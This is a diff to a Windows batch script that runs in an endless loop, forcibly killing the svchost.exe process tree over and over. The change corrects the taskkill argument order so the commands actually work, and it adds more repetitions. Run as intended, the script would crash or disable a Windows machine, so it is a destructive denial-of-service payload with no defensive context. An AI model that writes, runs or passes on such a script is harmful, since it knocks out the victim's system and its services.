@@ -1,12 +1,17 @@
 @echo off
 :loop
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
-taskkill /im /f svchost.exe /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
+taskkill /im svchost.exe /f /t
 goto loop
